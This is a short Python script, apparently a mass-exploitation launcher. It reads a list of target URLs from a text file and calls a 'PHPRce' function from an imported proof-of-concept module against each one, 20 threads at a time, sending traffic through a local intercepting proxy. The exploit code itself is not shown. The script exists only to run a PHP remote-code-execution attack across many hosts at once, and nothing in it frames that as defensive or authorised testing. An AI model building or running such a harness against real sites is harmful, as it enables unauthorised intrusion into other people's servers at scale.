import threading
import time
import random
import os
import csv
import requests
from datetime import datetime
import poc


if __name__=="__main__":
    os.environ["http_proxy"] = "http://127.0.0.1:8080"
    os.environ["https_proxy"] = "http://127.0.0.1:8080"
    c=datetime.now()
    urls=[]
    xc=20
    threads=[]
    fun='PHPRce'
    with open('url.txt','r',encoding="utf-8") as fp:
        urls=fp.readlines()
    for i,url in enumerate(urls):
        url=url.strip()
        threads.append(threading.Thread(target=getattr(poc,fun),args=(url,)))
        threads[i%xc].start()
        if (i+1)%xc==0 :
            for th in threads:
                th.join()
            threads=[]

    print(datetime.now()-c)